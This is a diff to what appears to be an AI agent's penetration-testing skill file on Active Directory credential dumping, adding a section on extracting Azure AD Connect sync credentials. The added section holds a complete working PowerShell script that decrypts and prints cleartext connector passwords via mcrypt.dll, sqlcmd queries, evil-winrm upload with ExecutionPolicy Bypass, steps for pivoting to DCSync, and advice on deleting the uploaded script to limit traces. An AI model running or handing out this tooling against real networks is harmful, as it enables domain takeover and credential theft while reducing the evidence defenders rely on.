@@ -2,15 +2,21 @@
 name: credential-dumping
 description: >
   Extracts credentials from Active Directory: DCSync replication, NTDS.dit
-  database extraction, SAM hive dump, LAPS passwords (legacy + Windows LAPS),
-  gMSA passwords (KDS root key + GoldenGMSA), dMSA exploitation (BadSuccessor
-  CVE-2025-21293), and DSRM credentials.
+  database extraction, SAM hive dump, Azure AD Connect (ADSync) credential
+  extraction, LAPS passwords (legacy + Windows LAPS), gMSA passwords (KDS
+  root key + GoldenGMSA), dMSA exploitation (BadSuccessor CVE-2025-21293),
+  and DSRM credentials.
 keywords:
   - DCSync
   - secretsdump
   - NTDS.dit
   - ntds extraction
   - SAM dump
+  - Azure AD Connect
+  - ADSync
+  - AAD Connect
+  - mcrypt
+  - DPAPI
   - LAPS password
   - gMSA password
   - dMSA
@@ -31,15 +37,16 @@ tools:
   - netexec
   - bloodyAD
   - gMSADumper
+  - sqlcmd
 opsec: medium
 ---
 
 # Credential Dumping
 
 You are helping a penetration tester extract credentials from Active
-Directory stores including domain databases, local machine hives, managed
-service accounts, and directory recovery secrets. All testing is under
-explicit written authorization.
+Directory stores including domain databases, local machine hives, Azure AD
+Connect sync databases, managed service accounts, and directory recovery
+secrets. All testing is under explicit written authorization.
 
 **Kerberos-first authentication**: All remote credential extraction
 commands use Kerberos authentication (`-k -no-pass`, `--use-kcache`)
@@ -119,6 +126,7 @@ Determine what you can extract based on current access:
 |-------------|---------------------|-------|
 | Replication rights (DS-Replication-Get-Changes + Get-Changes-All) | DCSync | Step 2 |
 | Domain Admin / DC local admin | DCSync, NTDS extraction, LAPS, gMSA | Step 2 or 3 |
+| Azure AD Connect admin (ADSyncAdmins, Azure Admins, or shell on AADConnect host) | ADSync credential extraction | Step 2b |
 | Local admin on target | SAM dump | Step 4 |
 | LAPS read permission (on computer object) | LAPS password read | Step 5 |
 | gMSA read permission (PrincipalsAllowedToRetrieve) | gMSA password | Step 6 |
@@ -193,6 +201,199 @@ lsadump::dcsync /domain:DOMAIN.LOCAL /all /csv
 - Generates **Event 4928/4929** (replication source/destination)
 - Targeted DCSync (single user) generates fewer events than full dump
 - CrowdStrike detects DCSync via replication GUID patterns
+
+## Step 2b: Azure AD Connect (ADSync) Credential Extraction
+
+Extract credentials stored in the Azure AD Connect synchronization database.
+The ADSync database contains encrypted connector account passwords — the
+on-premises AD connector typically runs as a high-privilege domain account
+(often Domain Admin or an account with DCSync rights) to sync password
+hashes to Azure AD.
+
+### When to Use
+
+- Azure AD Connect is installed (look for `ADSync` service, `AAD_` prefixed
+  service accounts, or `Microsoft Azure AD Sync` in Program Files)
+- You have a shell on the host running Azure AD Connect (usually the DC)
+- Your user is a member of `ADSyncAdmins`, `Azure Admins`, or has local
+  admin on the AADConnect host
+
+### Indicators of Azure AD Connect
+
+- Service account named `AAD_<hex>` or `MSOL_<hex>` in domain users
+- `ADSync` or `ADSync2019` Windows service running
+- `C:\Program Files\Microsoft Azure AD Sync\` directory exists
+- Port 1433 (SQL Server) or LocalDB instance with `ADSync` database
+
+### Step 1: Locate the ADSync Database
+
+The ADSync database runs on either a full SQL Server instance or LocalDB.
+Try SQL Server first — LocalDB is often inaccessible from WinRM sessions.
+
+```powershell
+# Check for ADSync service
+Get-Service | Where-Object {$_.Name -like '*ADSync*'}
+
+# Check install directory
+ls "C:\Program Files\Microsoft Azure AD Sync\Bin"
+
+# Try full SQL Server instance (use hostname as server name)
+sqlcmd -S HOSTNAME -Q "SELECT name FROM sys.databases" -E
+# Look for 'ADSync' in the output
+
+# If full SQL Server fails, try LocalDB instances
+sqlcmd -S "(localdb)\.ADSync" -Q "SELECT name FROM sys.databases" -E
+sqlcmd -S "(localdb)\.ADSync2019" -Q "SELECT name FROM sys.databases" -E
+sqlcmd -S "(localdb)\MSSQLLocalDB" -Q "SELECT name FROM sys.databases" -E
+```
+
+**Common issue:** LocalDB instances often fail from WinRM sessions due to
+user profile and named pipe access restrictions. Full SQL Server instances
+work reliably. If all SQL access fails, check the ADSync configuration file
+for the connection string:
+
+```powershell
+type "C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf"
+# or check the config
+type "C:\ProgramData\ADSync\Configuration\Exported-ServerConfiguration.xml"
+```
+
+### Step 2: Extract Encrypted Credentials
+
+Query the ADSync database for connector configurations and keying material:
+
+```powershell
+# Get connector names and encrypted configurations
+sqlcmd -S HOSTNAME -d ADSync -E -Q "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent"
+
+# Get DPAPI keying material
+sqlcmd -S HOSTNAME -d ADSync -E -Q "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
+```
+
+The `private_configuration_xml` column contains the connector type and
+target domain. The `encrypted_configuration` column contains the
+Base64-encoded encrypted password.
+
+### Step 3: Decrypt with mcrypt.dll
+
+The ADSync installation includes `mcrypt.dll` which provides DPAPI-based
+decryption. The decryption workflow uses the `KeyManager` class to load
+the keyset, retrieve the active credential key, and decrypt the encrypted
+configuration.
+
+**Upload this script to the target and execute it:**
+
+```powershell
+# decrypt_adsync.ps1 — Azure AD Connect credential extraction
+# Requires: shell on ADSync host, SQL access to ADSync database
+
+# Load the mcrypt assembly
+Add-Type -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll"
+
+# Get keying material from ADSync database
+$sqlServer = $env:COMPUTERNAME  # adjust if SQL is on a different host
+$results = @()
+$conn = New-Object System.Data.SqlClient.SqlConnection
+$conn.ConnectionString = "Server=$sqlServer;Database=ADSync;Integrated Security=True"
+$conn.Open()
+
+# Get keyset info
+$cmd = $conn.CreateCommand()
+$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
+$reader = $cmd.ExecuteReader()
+$reader.Read() | Out-Null
+$key_id = $reader.GetInt32(0)
+$instance_id = $reader.GetGuid(1)
+$entropy = $reader.GetGuid(2)
+$reader.Close()
+
+# Get encrypted connector configs
+$cmd2 = $conn.CreateCommand()
+$cmd2.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent"
+$reader2 = $cmd2.ExecuteReader()
+
+while ($reader2.Read()) {
+    $config = $reader2.GetString(0)
+    $encrypted = $reader2.GetString(1)
+
+    # Initialize KeyManager and load keyset
+    $km = New-Object Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+    $km.LoadKeySet($entropy, $instance_id, $key_id)
+    $key = $null
+    $km.GetActiveCredentialKey([ref]$key)
+
+    # Decrypt
+    $plaintext = $null
+    $key.DecryptBase64ToString($encrypted, [ref]$plaintext)
+
+    # Extract domain and username from private config
+    $domain = ([xml]$config).SelectSingleNode("//parameter[@name='forest-login-domain']").text
+    $username = ([xml]$config).SelectSingleNode("//parameter[@name='forest-login-user']").text
+
+    if (-not $username) {
+        # AAD connector uses different XML structure
+        $username = "AAD Connector"
+        $domain = "Azure AD"
+    }
+
+    Write-Host "Domain:   $domain"
+    Write-Host "Username: $username"
+    Write-Host "Password: $plaintext"
+    Write-Host "---"
+}
+$reader2.Close()
+$conn.Close()
+```
+
+**Upload and execute via evil-winrm:**
+
+```
+# evil-winrm session
+upload /path/to/decrypt_adsync.ps1
+powershell -ExecutionPolicy Bypass -File .\decrypt_adsync.ps1
+```
+
+**Important — evil-winrm upload syntax:** Use `upload <local_path>` without
+specifying a remote destination path. evil-winrm uploads to the current
+working directory. Specifying a full Windows path as the destination can
+cause path mangling (e.g., `C:Users...` instead of `C:\Users\...`).
+
+### Common Failures and Fixes
+
+| Error | Cause | Fix |
+|-------|-------|-----|
+| `LoadKeySet` is not static | Called as `[KeyManager]::LoadKeySet()` | Instantiate: `$km = New-Object ...KeyManager; $km.LoadKeySet(...)` |
+| Wrong argument count for `GetActiveCredentialKey` | Passed extra params | Takes 1 param only: `$km.GetActiveCredentialKey([ref]$key)` |
+| Null-conditional operator `?.` error | PowerShell 5.1 (Server 2016/2019) | Use `if ($x) { $x.Property }` instead of `$x?.Property` |
+| MCrypt class not found | Wrong namespace | Full namespace: `Microsoft.DirectoryServices.MetadirectoryServices.Cryptography` |
+| `Get-ADSyncConnector` COM class factory error | DCOM limitation in WinRM | Don't use the ADSync PowerShell module — use mcrypt.dll directly |
+| LocalDB access denied | WinRM session lacks user profile context | Use full SQL Server instance (`HOSTNAME`) instead of `(localdb)\...` |
+| SQL connection fails | ADSync uses named instance | Try `HOSTNAME\SQLEXPRESS`, `HOSTNAME\ADSync`, or check services for SQL instance name |
+
+### What This Extracts
+
+The ADSync database typically contains two connector accounts:
+
+1. **On-premises AD connector** — domain account that syncs AD objects.
+   Often runs as `DOMAIN\Administrator` or a service account with DCSync
+   rights. **This is the high-value target.**
+2. **AAD connector** — Azure AD tenant account used for cloud sync.
+   Format: `Sync_HOSTNAME_<hex>@tenant.onmicrosoft.com`.
+
+If the on-premises connector runs as a domain admin or has replication
+rights, use the extracted cleartext password for DCSync (Step 2) to
+extract all domain hashes.
+
+### OPSEC Notes
+
+- Requires uploading a PowerShell script to the target (artifact)
+- SQL queries to ADSync database may be logged if SQL audit is enabled
+- **Clean up uploaded scripts** after extraction:
+  `Remove-Item .\decrypt_adsync.ps1 -Force`
+- The extraction itself is a local database read — no network detection
+  signatures
+- Subsequent DCSync with extracted creds generates standard replication
+  events (4662, 4928/4929)
 
 ## Step 3: NTDS Extraction (Offline)
 
@@ -641,6 +842,7 @@ findstr /S /I cpassword \\DOMAIN.LOCAL\SYSVOL\DOMAIN.LOCAL\Policies\*.xml
 | DCSync (full domain) | **MEDIUM** | 4662, 4928/4929 | Many replication events |
 | NTDS extraction (VSS) | **HIGH** | 8222 (VSS), file access | Large file exfiltration |
 | NTDS (ntdsutil) | **HIGH** | 325, process creation | Native tool but noisy |
+| Azure AD Connect | **LOW-MEDIUM** | SQL query, file upload | Local DB read, script artifact on disk |
 | SAM dump (remote) | **MEDIUM** | 4624, registry access | Standard admin operation |
 | LAPS read (legacy) | **LOW** | LDAP query only | Normal directory read |
 | LAPS read (Windows) | **LOW** | LDAP + decryption | Authorized operation |
